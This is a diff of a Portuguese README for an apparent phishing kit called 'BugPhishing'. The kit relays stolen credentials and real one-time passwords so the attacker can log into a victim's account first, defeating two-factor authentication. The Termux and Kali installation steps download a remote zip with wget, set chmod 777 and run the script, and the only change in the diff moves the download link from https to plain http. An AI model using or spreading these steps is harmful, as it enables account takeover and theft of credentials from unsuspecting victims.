@@ -2,7 +2,7 @@
 Quando a vítima insere suas credenciais, você precisa ir ao site original e usar essas credenciais para enviar OTP real para a vítima. Assim que ele entrar nesse OTP, esse OTP também estará lá com você e você terá permissão para fazer login na conta antes dele.
 
 ### INSTALAÇÃO [ TERMUX -- ANDROID ]
-* wget https://download947.mediafire.com/dyv0993oq71g/2falbjwoyp8av7u/BugPhishing.zip
+* wget http://download947.mediafire.com/44ygg4s4r51g/2falbjwoyp8av7u/BugPhishing.zip
 * unzip BugPhishing
 * cd BugPhishing/
 * chmod 777 *
@@ -10,7 +10,7 @@ Quando a vítima insere suas credenciais, você precisa ir ao site original e us
 * ./BugPhishing.sh
 
 ### INSTALAÇÃO [ KALI ]
-* wget https://download947.mediafire.com/dyv0993oq71g/2falbjwoyp8av7u/BugPhishing.zip
+* wget http://download947.mediafire.com/44ygg4s4r51g/2falbjwoyp8av7u/BugPhishing.zip
 * unzip BugPhishing
 * cd BugPhishing/
 * chmod 777 *
